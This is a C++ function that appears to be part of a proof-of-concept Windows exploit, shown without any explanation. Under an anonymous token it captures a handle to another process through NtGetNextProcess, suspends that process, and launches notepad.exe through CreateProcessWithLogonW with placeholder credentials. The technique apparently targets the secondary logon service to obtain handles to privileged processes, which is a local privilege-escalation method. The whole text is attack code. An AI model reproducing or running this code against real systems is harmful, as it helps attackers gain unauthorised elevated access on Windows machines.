DWORD CALLBACK CaptureAndSuspendProcess(LPVOID)
{
  ImpersonateAnonymousToken(GetCurrentThread());

  while (NtGetNextProcess(nullptr, MAXIMUM_ALLOWED, 0, 0, &g_hProcess) != 0)
  {
  }
  NTSTATUS status = NtSuspendProcess(g_hProcess);

  printf("Suspended process: %08X %p %d\n", status, g_hProcess, GetProcessId(g_hProcess));
  RevertToSelf();

  SetProcessId(GetProcessId(g_hProcess));
  
  WCHAR cmdline[] = L"notepad.exe";
  STARTUPINFO startInfo = {};
  PROCESS_INFORMATION procInfo = {};
  startInfo.cb = sizeof(startInfo);
  if (CreateProcessWithLogonW(L"user", L"domain", L"password", LOGON_NETCREDENTIALS_ONLY,
    nullptr, cmdline, CREATE_SUSPENDED, nullptr, nullptr, &startInfo, &procInfo))
  {
    printf("Created process %d\n", procInfo.dwProcessId);
  }
  else
  {
    printf("Create error: %d\n", GetLastError());
  }
  TerminateProcess(g_hProcess, 0);
  ExitProcess(0);

  return 0;
}